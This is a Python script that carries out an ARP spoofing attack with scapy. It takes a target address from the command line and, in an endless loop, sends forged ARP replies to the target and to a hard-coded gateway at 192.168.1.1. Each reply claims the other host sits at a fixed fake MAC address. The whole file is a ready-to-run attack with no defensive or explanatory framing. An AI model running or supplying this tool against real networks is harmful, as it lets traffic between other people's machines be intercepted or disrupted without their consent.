#!/usr/bin/env python3
"""
ARP Spoofer.

This script performs ARP spoofing attack by sending spoofed ARP packets.

Usage:
  python3 arp_spoofer.py -t <target>

Example:
  python3 arp_spoofer.py -t 10.0.0.1
"""

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

def signal_handler(sig, frame):
    """
    Handles SIGINT signal (Ctrl+C) gracefully.
    Exits the program with an appropriate message.

    Args:
        sig: Signal number
        frame: Current stack frame
    """
    print(colored(f"\n[!] Ctrl + C pressed...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def get_arguments():
    """
    Parses command line arguments.

    Returns:
        str: The IP address of the target to spoof.
    """
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")
    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    """
    Performs ARP spoofing attack by sending spoofed ARP packets.

    Args:
        ip_address (str): The IP address of the target to spoof.
        spoof_ip (str): The IP address to spoof as.
    """
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)

def main():
    """
    Main function to execute the ARP spoofing attack.
    """
    arguments = get_arguments()
    while True:
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.1.1", arguments.ip_address)
        time.sleep(2)

if __name__ == "__main__":
    main()
